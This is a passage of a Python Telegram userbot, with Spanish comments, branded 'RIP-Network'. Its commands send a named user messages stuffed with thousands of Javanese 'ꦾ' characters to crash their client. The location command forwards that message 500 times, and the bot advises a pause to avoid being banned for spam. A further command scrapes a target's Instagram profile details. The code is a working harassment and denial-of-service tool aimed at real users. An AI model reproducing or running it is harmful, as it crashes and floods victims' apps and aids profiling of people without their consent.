ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ```"

        # Obtener la entidad del usuario
        user = await client.get_entity(username)

        # Enviar el archivo de audio con el mensaje al usuario mencionado
        message = await client.send_file(user, file=audio_path, caption=message_text)
        print(f"{GREEN}[*] Audio enviado a {username}.{RESET}")
        await event.respond("```[🌀] Telegram API V2 Bug enviado con exito!\n\n[🙇] Cantidad procesada: 500\n\n[💤] Tipo de crash: MediaSenderBug\n\n[🎃] Creador: RIP-Network\n\n[🔐]NOTA: Espere 10s antes de volver a usar el comando para evitar ban de la cuenta como spam o actividad sospechosa.```[///////////////////////////////////////////////////////](https://telegra.ph/file/05b7e6f87cea4b76ac67a.png)", parse_mode="markdown")

        # Reenviar el mensaje 5 veces
        for _ in range(1):
            await client.forward_messages(user, message)
            print(f"{GREEN}[*] Audio reenviado a {username}.{RESET}")
            await asyncio.sleep(1)  # Pausa de 1 segundo entre reenvíos

    except Exception as e:
        logging.error(f"Error en audio_handler: {e}")
        await event.respond(f"[🛑] Error al enviar el audio a @{username}: {e}")

@client.on(events.NewMessage(pattern=r'\.locbug @(\w+)'))
async def location_handler(event):
    try:
        # Obtener el usuario mencionado
        username = event.pattern_match.group(1)
        latitude = 37.7749  # Latitud predeterminada (por ejemplo, San Francisco)
        longitude = -122.4194  # Longitud predeterminada (por ejemplo, San Francisco)
        message_text = "```🧾 Telegram API V2 🧾 \n RIP-Network!? ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾiꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾoꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ```"

        # Obtener la entidad del usuario
        user = await client.get_entity(username)

        # Crear InputGeoPoint
        geo_point = types.InputGeoPoint(latitude, longitude)
        media_geo = types.InputMediaGeoPoint(geo_point)

        # Enviar la ubicación con el mensaje al usuario mencionado
        message = await client.send_file(user, file=media_geo, caption=message_text)
        print(f"{GREEN}[*] Ubicación enviada a {username}.{RESET}")
        await event.respond("```[🌀] Telegram API V2 Bug enviado con exito!\n\n[🙇] Cantidad procesada: 500\n\n[💤] Tipo de crash: LocationMessageBug\n\n[🎃] Creador: RIP-Network\n\n[🔐]NOTA: Espere 10s antes de volver a usar el comando para evitar ban de la cuenta como spam o actividad sospechosa.```[///////////////////////////////////////////////////////](https://telegra.ph/file/05b7e6f87cea4b76ac67a.png)", parse_mode="markdown")

        # Reenviar la ubicación 5 veces
        for _ in range(500):
            await client.forward_messages(user, message)
            print(f"{GREEN}[*] Ubicación reenviada a {username}.{RESET}")
            await asyncio.sleep(1)  # Pausa de 1 segundo entre reenvíos

    except Exception as e:
        logging.error(f"Error en location_handler: {e}")
        await event.respond(f"[🛑] Error al enviar la ubicación a @{username}: {e}")
        


# Función igosint
@client.on(events.NewMessage(pattern=r'\.igosint @(\w+)'))
async def igosint_handler(event):
    try:
        # Obtener el nombre de usuario de Instagram mencionado
        username = event.pattern_match.group(1)

        # Crear una instancia de Instaloader
        loader = instaloader.Instaloader()

        try:
            # Obtener el perfil de Instagram
            profile = instaloader.Profile.from_username(loader.context, username)

            # Formatear la información del perfil
            profile_info = (
                f"Nombre de usuario: {profile.username}\n"
                f"ID: {profile.userid}\n"
                f"Nombre completo: {profile.full_name}\n"
                f"Biografía: {profile.biography}\n"
                f"Categoría de negocio: {profile.business_category_name}\n"
                f"URL externa: {profile.external_url}\n"
                f"Seguidores: {profile.followers}\n"
                f"Siguiendo: {profile.followees}\n"
                f"Publicaciones: {profile.mediacount}\n"
                f"URL de la foto de perfil: {profile.profile_pic_url}\n"
                f"Cuenta verificada: {'Sí' if profile.is_verified else 'No'}\n"
                f"Cuenta privada: {'Sí' if profile.is_private else 'No'}\n"
                f"Tiene historias destacadas: {'Sí' if profile.has_highlight_reels else 'No'}\n"
                f"Tiene historias públicas: {'Sí' if profile.has_public_story else 'No'}\n"
                f"Tiene historias visibles: {'Sí' if profile.has_viewable_story else 'No'}\n"
                f"Cuenta de negocio: {'Sí' if profile.is_business_account else 'No'}\n"
                f"IGTV: {profile.igtvcount}"
            )

            # Enviar la información del perfil como respuesta
            await event.respond(profile_info)

        except Exception as e:
            logging.error(f"Error al obtener el perfil de Instagram: {e}")
            await event.respond(f"[🛑] Error al obtener la información de @{username}: {e}")

    except Exception as e:
        logging.error(f"Error en igosint_handler: {e}")
        await event.respond(f"[🛑] Error al procesar el comando para @{username}: {e}")



async def main():
    try:
        print_banner()
        
        await client.start(phone_number)
        print(f"{GREEN}[*] Bot iniciado y conectado.{RESET}")
        await client.run_until_disconnected()
    except SessionPasswordNeededError:
        print(f"{RED}[!] Se requiere contraseña de segundo factor.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error al iniciar el bot: {e}{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Bot detenido.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error durante la ejecución: {e}{RESET}")